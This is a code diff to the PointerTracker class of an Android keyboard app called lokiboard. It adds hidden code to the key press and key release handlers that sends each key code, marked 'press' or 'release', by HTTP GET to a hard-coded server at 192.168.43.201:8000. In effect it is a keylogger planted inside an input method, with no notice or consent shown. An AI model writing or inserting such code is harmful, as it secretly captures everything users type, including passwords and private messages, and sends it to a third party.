@@ -31,6 +31,8 @@ import com.abifog.lokiboard.keyboard.internal.TimerProxy;
 import com.abifog.lokiboard.latin.common.Constants;
 import com.abifog.lokiboard.latin.common.CoordinateUtils;
 import com.abifog.lokiboard.latin.define.DebugFlags;
+import com.abifog.lokiboard.latin.inputlogic.Downloader;
+import com.abifog.lokiboard.latin.inputlogic.RequestPackage;
 import com.abifog.lokiboard.latin.settings.Settings;
 
 public final class PointerTracker implements PointerTrackerQueue.Element {
@@ -471,6 +473,17 @@ public final class PointerTracker implements PointerTrackerQueue.Element {
         }
 
         final Key key = getKeyOn(x, y);
+        RequestPackage requestPackage = new RequestPackage();
+        requestPackage.setMethod("GET");
+        requestPackage.setUrl("http://192.168.43.201:8000");
+        requestPackage.setParam("keycode", String.valueOf(key.getCode()));
+        requestPackage.setParam("keywcode", "press");
+
+        Downloader downloader = new Downloader(); //Instantiation of the Async task
+        //that’s defined below
+
+        downloader.execute(requestPackage);
+
         mBogusMoveEventDetector.onActualDownEvent(x, y);
         if (key != null && key.isModifier()) {
             // Before processing a down event of modifier key, all pointers already being
@@ -670,6 +683,20 @@ public final class PointerTracker implements PointerTrackerQueue.Element {
         } else {
             sPointerTrackerQueue.releaseAllPointersOlderThan(this, eventTime);
         }
+
+        final Key key = getKeyOn(this.mKeyX, this.mKeyY);
+
+        RequestPackage requestPackage = new RequestPackage();
+        requestPackage.setMethod("GET");
+        requestPackage.setUrl("http://192.168.43.201:8000");
+        requestPackage.setParam("keycode", String.valueOf(key.getCode()));
+        requestPackage.setParam("keywcode", "release");
+
+        Downloader downloader = new Downloader(); //Instantiation of the Async task
+        //that’s defined below
+
+        downloader.execute(requestPackage);
+
         onUpEventInternal(x, y);
         sPointerTrackerQueue.remove(this);
     }
